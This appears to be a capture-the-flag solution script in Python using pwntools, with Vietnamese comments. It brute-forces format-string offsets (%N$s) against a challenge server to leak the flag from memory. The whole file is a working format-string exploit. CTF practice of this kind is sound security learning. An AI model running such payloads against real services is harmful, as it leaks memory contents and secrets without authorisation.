from pwn import *

HOST = "echochamber.deadface.io"
PORT = 13337

def find_flag():
    for i in range(1, 100): # Thử từ offset 1 đến 99
        try:
            # Kết nối lại cho mỗi lần thử để đảm bảo stack sạch
            p = remote(HOST, PORT)
            p.recvuntil(b"Enter your message:")

            # Tạo payload, ví dụ %10$s
            payload = f"%{i}$s".encode()
            log.info(f"Trying payload: {payload}")
            
            p.sendline(payload)

            # Đọc phản hồi
            response = p.recvall(timeout=1)
            
            # Kiểm tra xem flag có trong phản hồi không
            if b'deadface{' in response:
                log.success(f"FLAG FOUND AT OFFSET {i}!")
                # In ra toàn bộ phản hồi để lấy flag
                print(response.decode(errors='ignore'))
                p.close()
                return
            
            p.close()

        except Exception as e:
            log.error(f"Error at offset {i}: {e}")
            if 'p' in locals() and p:
                p.close()

find_flag()